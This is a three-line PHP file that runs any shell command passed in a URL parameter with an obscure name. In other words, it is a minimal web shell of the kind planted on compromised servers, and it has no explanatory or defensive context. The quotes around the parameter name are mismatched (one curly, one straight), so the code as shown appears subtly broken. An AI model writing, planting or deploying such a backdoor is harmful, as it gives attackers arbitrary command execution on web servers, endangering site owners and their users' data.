<?php
shell_exec($_GET[’0zyYq84j']);
?>
